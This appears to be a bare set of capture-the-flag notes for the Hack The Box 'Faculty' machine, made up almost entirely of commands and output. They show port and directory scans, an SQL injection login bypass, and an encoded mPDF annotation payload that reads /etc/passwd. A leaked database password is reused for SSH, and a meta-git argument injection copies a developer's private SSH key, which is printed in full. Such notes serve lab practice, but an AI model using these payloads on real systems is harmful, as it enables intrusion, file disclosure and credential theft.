
```
└─$ nmap -A -p- -T4 -Pn faculty.htb 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 10:47 CDT
Nmap scan report for faculty.htb (10.129.251.2)
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
```



─$ feroxbuster -u http://faculty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
302      GET      359l      693w        0c http://faculty.htb/ => login.php
301      GET        7l       12w      178c http://faculty.htb/admin => http://faculty.htb/admin/
500      GET        0l        0w        0c http://faculty.htb/test.php
200      GET      132l      235w        0c http://faculty.htb/login.php
200      GET      175l      311w        0c http://faculty.htb/admin/login.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets => http://faculty.htb/admin/assets/
301      GET        7l       12w      178c http://faculty.htb/admin/database => http://faculty.htb/admin/database/
200      GET        1l        0w        0c http://faculty.htb/admin/download.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/css => http://faculty.htb/admin/assets/css/
301      GET        7l       12w      178c http://faculty.htb/admin/assets/js => http://faculty.htb/admin/assets/js/
301      GET        7l       12w      178c http://faculty.htb/admin/assets/img => http://faculty.htb/admin/assets/img/
200      GET        0l        0w        0c http://faculty.htb/admin/ajax.php
200      GET      106l      167w        0c http://faculty.htb/admin/home.php
200      GET       70l      105w        0c http://faculty.htb/admin/users.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/uploads => http://faculty.htb/admin/assets/uploads/
302      GET      359l      693w        0c http://faculty.htb/index.php => login.php
302      GET      420l      809w        0c http://faculty.htb/admin/index.php => login.php
500      GET       43l       88w        0c http://faculty.htb/admin/events.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/uploads/gallery => http://faculty.htb/admin/assets/uploads/gallery/
200      GET        0l        0w        0c http://faculty.htb/admin/article.txt
200      GET       47l      106w        0c http://faculty.htb/header.php
200      GET       47l      106w        0c http://faculty.htb/admin/header.php
200      GET      218l      445w        0c http://faculty.htb/admin/courses.php
200      GET      201l      371w        0c http://faculty.htb/admin/schedule.php
200      GET        0l        0w        0c http://faculty.htb/admin/readme.txt
301      GET        7l       12w      178c http://faculty.htb/admin/assets/vendor => http://faculty.htb/admin/assets/vendor/
200      GET      218l      372w        0c http://faculty.htb/admin/faculty.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/vendor/jquery => http://faculty.htb/admin/assets/vendor/jquery/
200      GET       28l       70w        0c http://faculty.htb/admin/navbar.php
200      GET        0l        0w        0c http://faculty.htb/admin/db_connect.php
200      GET      232l      458w        0c http://faculty.htb/admin/subjects.php
301      GET        7l       12w      178c http://faculty.htb/mpdf => http://faculty.htb/mpdf/
301      GET        7l       12w      178c http://faculty.htb/mpdf/tmp => http://faculty.htb/mpdf/tmp/
301      GET        7l       12w      178c http://faculty.htb/mpdf/includes => http://faculty.htb/mpdf/includes/
500      GET        0l        0w        0c http://faculty.htb/mpdf/config.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/classes => http://faculty.htb/mpdf/classes/
200      GET        0l        0w        0c http://faculty.htb/mpdf/includes/out.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/includes/functions.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/font => http://faculty.htb/mpdf/font/
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/gif.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/graph.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/barcode.php
200      GET       37l       84w        0c http://faculty.htb/topbar.php
200      GET       37l       84w        0c http://faculty.htb/admin/topbar.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/patterns => http://faculty.htb/mpdf/patterns/
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/en.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/de.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/fr.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/sea.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/es.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/it.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/ru.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/nl.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/pl.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/sv.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/fi.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/qrcode => http://faculty.htb/mpdf/qrcode/
301      GET        7l       12w      178c http://faculty.htb/mpdf/qrcode/data => http://faculty.htb/mpdf/qrcode/data/
500      GET        0l        0w        0c http://faculty.htb/mpdf/qrcode/image.php
200      GET       94l     1552w        0c http://faculty.htb/mpdf/qrcode/index.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/bmp.php
200      GET        1l        1w       29c http://faculty.htb/mpdf/patterns/dictionary.txt
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/grad.php
200      GET        1l       15w        0c http://faculty.htb/mpdf/compress.php
500      GET        0l        0w        0c http://faculty.htb/mpdf/classes/svg.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/meter.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/mpdf.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/myanmar.php


http://faculty.htb/admin/login.php

'or'1=1#
'or'1=1#



```
POST /admin/download.php HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 264
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=courses
Cookie: PHPSESSID=hneu6on85983rv7piegcgjot0d
Cache-Control: max-age=0

pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

http://faculty.htb/mpdf/tmp/OKQVoYJgi9AqWEu045DZNwdzfX.pdf


└─$ cat db_connect.php 
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
                    


└─$ ssh gbyolo@faculty.htb          
The authenticity of host 'faculty.htb (10.129.251.2)' can't be established.
ED25519 key fingerprint is SHA256:JYKRgj5yk9qD3GxSCsRAgUIBAhmTssq961F3rHxWlnY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'faculty.htb' (ED25519) to the list of known hosts.
gbyolo@faculty.htb's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 30 19:33:17 CEST 2022

  System load:           0.02
  Usage of /:            80.4% of 4.67GB
  Memory usage:          57%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.129.251.2
  IPv6 address for eth0: dead:beef::250:56ff:feb9:93ab


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
gbyolo@faculty:~$ 

https://hackerone.com/reports/728040
```
gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa'
meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa' at id_rsa
```


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
